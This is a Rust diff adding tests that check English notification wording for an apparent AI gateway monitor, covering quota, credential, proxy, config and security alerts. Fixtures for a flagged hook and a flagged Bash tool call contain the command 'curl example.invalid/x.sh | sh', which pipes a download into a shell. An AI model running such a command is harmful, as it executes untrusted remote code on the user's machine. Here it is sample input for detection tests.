@@ -3,6 +3,7 @@
 use std::sync::{Arc, Mutex};
 
 use super::*;
+use crate::i18n::{Lang, with_lang};
 
 /// 记下被投递出去的标题
 #[derive(Default)]
@@ -381,4 +382,253 @@ fn a_quota_report_below_the_limit_clears_that_window() {
     });
     let keys: Vec<&str> = signals.iter().map(|s| s.key.as_str()).collect();
     assert_eq!(keys, ["quota:chatgpt:weekly"], "用完的那个窗口不该被撤掉");
+}
+
+// ---------------------------------------------------------------- 英文
+
+/// 有没有中文：汉字、中文标点、全角符号
+fn has_chinese(s: &str) -> bool {
+    s.chars().any(|c| {
+        let c = c as u32;
+        (0x3000..=0x303f).contains(&c)
+            || (0x4e00..=0x9fff).contains(&c)
+            || (0xff00..=0xffef).contains(&c)
+    })
+}
+
+fn quota_exhausted(window: &str, reset_in_secs: Option<u64>) -> tw_api::Event {
+    tw_api::Event::QuotaExhausted {
+        id: 1,
+        provider: "chatgpt".into(),
+        window: window.into(),
+        reset_in_secs,
+        at_ms: T0,
+    }
+}
+
+/// 英文界面下，规则层自己写的字全是英文。core 给的那几段（原因、说明）原样转述、
+/// 不归这一层翻译 —— 这里给的就是英文
+#[test]
+fn in_english_no_rule_writes_a_chinese_word() {
+    use crate::supervisor::CoreState;
+    let finding = tw_api::ScanFinding {
+        level: "high".into(),
+        rule: "hook-curl-pipe".into(),
+        kind: "hooks".into(),
+        client: "claude-code".into(),
+        path: "~/.claude/settings.json".into(),
+        line: 3,
+        title: "A hook runs a downloaded script".into(),
+        detail: "The hook pipes a download into a shell".into(),
+        excerpt: "curl example.invalid/x.sh | sh".into(),
+    };
+    let flagged = |blocked: bool| tw_api::Event::ToolCallFlagged {
+        id: 1,
+        provider: "relay".into(),
+        tool: "Bash".into(),
+        rule: "curl-pipe-sh".into(),
+        why: "The command pipes a download into a shell".into(),
+        excerpt: "curl example.invalid/x.sh | sh".into(),
+        high: true,
+        blocked,
+        at_ms: T0,
+    };
+    let events = vec![
+        quota_exhausted("5h", Some(7_200)),
+        quota_exhausted("weekly", Some(90)),
+        quota_exhausted("7d", Some(30)),
+        quota_exhausted("weekly", None),
+        tw_api::Event::HealthChanged {
+            id: 1,
+            provider: "relay".into(),
+            state: "open".into(),
+            at_ms: T0,
+        },
+        tw_api::Event::CredentialExpired {
+            id: 1,
+            provider: "chatgpt".into(),
+            detail: "The refresh token was revoked".into(),
+            at_ms: T0,
+        },
+        tw_api::Event::AuthChanged {
+            id: 1,
+            provider: "relay".into(),
+            state: "rejected".into(),
+            status: Some(401),
+            at_ms: T0,
+        },
+        tw_api::Event::ProxyChanged {
+            id: 1,
+            proxy: "hk".into(),
+            state: "unreachable".into(),
+            detail: Some("Connection refused".into()),
+            at_ms: T0,
+        },
+        tw_api::Event::StorageChanged {
+            id: 1,
+            level: "stopped".into(),
+            free_bytes: 200 * 1024 * 1024,
+            at_ms: T0,
+        },
+        tw_api::Event::StorageChanged {
+            id: 1,
+            level: "metadata_only".into(),
+            free_bytes: 3 * 1024 * 1024 * 1024,
+            at_ms: T0,
+        },
+        tw_api::Event::ConfigRejected {
+            id: 1,
+            stage: "schema".into(),
+            message: "Unknown field kye".into(),
+            line: Some(4),
+            excerpt: None,
+            origin: "external".into(),
+            at_ms: T0,
+        },
+        tw_api::Event::CredentialRotated {
+            id: 1,
+            provider: "claude-max".into(),
+            persisted: false,
+            detail: "config.yaml is read-only".into(),
+            at_ms: T0,
+        },
+        flagged(true),
+        flagged(false),
+        tw_api::Event::ScanAlert {
+            id: 1,
+            alerts: vec![finding.clone(), finding],
+            at_ms: T0,
+        },
+    ];
+    let states = [
+        CoreState::SafeMode,
+        CoreState::Restarting {
+            attempt: 3,
+            in_ms: 1_000,
+        },
+    ];
+    with_lang(Lang::En, || {
+        let mut signals: Vec<Signal> = events.iter().flat_map(rules::from_event).collect();
+        signals.extend(states.iter().flat_map(rules::from_core_state));
+        assert_eq!(
+            signals.len(),
+            events.len() + states.len(),
+            "每一件都该说一句"
+        );
+        for s in &signals {
+            assert!(
+                !has_chinese(&s.title) && !has_chinese(&s.body),
+                "{} | {}",
+                s.title,
+                s.body
+            );
+            // macOS 的通知标题不带句末标点；正文是完整的句子
+            assert!(!s.title.ends_with('.'), "{}", s.title);
+            assert!(s.body.ends_with('.'), "{}", s.body);
+        }
+        for c in Category::ALL {
+            assert!(!has_chinese(c.label()), "{c:?}: {}", c.label());
+        }
+    });
+}
+
+#[test]
+fn an_english_notice_reads_as_whole_sentences() {
+    with_lang(Lang::En, || {
+        let s = &rules::from_event(&quota_exhausted("5h", Some(7_200)))[0];
+        assert_eq!(s.title, "“chatgpt” Subscription Quota Used Up");
+        assert_eq!(
+            s.body,
+            "The 5-hour usage limit has been reached and resets in about 2 hours. \
+             Requests through this upstream will be rejected."
+        );
+        // 单数和复数、没有重置时间
+        let body = |w: &str, secs| rules::from_event(&quota_exhausted(w, secs))[0].body.clone();
+        assert!(
+            body("weekly", Some(3_600)).contains("resets in about 1 hour."),
+            "{}",
+            body("weekly", Some(3_600))
+        );
+        assert!(
+            body("7d", Some(90)).starts_with(
+                "The 7-day usage limit has been reached and resets in about 1 minute."
+            )
+        );
+        assert!(body("weekly", Some(30)).contains("and resets shortly."));
+        assert!(body("weekly", None).starts_with("The weekly usage limit has been reached. "));
+
+        let s = &rules::from_event(&tw_api::Event::ConfigRejected {
+            id: 1,
+            stage: "schema".into(),
+            message: "unknown field kye".into(),
+            line: Some(4),
+            excerpt: None,
+            origin: "external".into(),
+            at_ms: T0,
+        })[0];
+        assert_eq!(s.title, "Config File Failed Validation");
+        assert_eq!(
+            s.body,
+            "Line 4: unknown field kye. The previous configuration remains in effect."
+        );
+    });
+}
+
+/// 总线自己加的那几个字（被压下的条数、时断时续、已恢复）也跟着语言走
+#[test]
+fn the_bus_adds_its_own_words_in_english_too() {
+    with_lang(Lang::En, || {
+        // 桶里三个令牌：第四、五条只进列表，拿得到令牌的下一条带上数目
+        let b = bed();
+        for i in 0..5 {
+            b.bus.ingest(
+                Signal::raised(
+                    format!("quota:relay-{i}:weekly"),
+                    Level::Warning,
+                    "Quota Used Up",
+                )
+                .now(),
+                T0 + i,
+            );
+        }
+        b.bus.ingest(
+            Signal::raised("gateway", Level::Critical, "Gateway Not Forwarding")
+                .body("Startup failed.")
+                .now(),
+            T0 + 10,
+        );
+        assert_eq!(
+            b.bodies().last().unwrap(),
+            "Gateway Not Forwarding|Startup failed. (2 more notices pending)"
+        );
+
+        let b = bed();
+        for i in 0..4 {
+            let t = T0 + i * 1_000;
+            b.bus.ingest(
+                Signal::raised("proxy:hk", Level::Warning, "Proxy “hk” Unreachable").now(),
+                t,
+            );
+            b.bus.ingest(Signal::cleared("proxy:hk"), t + 500);
+        }
+        assert!(
+            b.bus
+                .list()
+                .iter()
+                .any(|n| n.title == "Proxy “hk” Unreachable (Intermittent)"),
+            "{:?}",
+            b.bus.list()
+        );
+
+        let b = bed();
+        b.bus.ingest(
+            Signal::raised("gateway", Level::Critical, "Gateway Not Forwarding").now(),
+            T0,
+        );
+        b.bus.ingest(Signal::cleared("gateway"), T0 + 600_000);
+        assert_eq!(
+            b.titles().last().unwrap(),
+            "Resolved: Gateway Not Forwarding"
+        );
+    });
 }
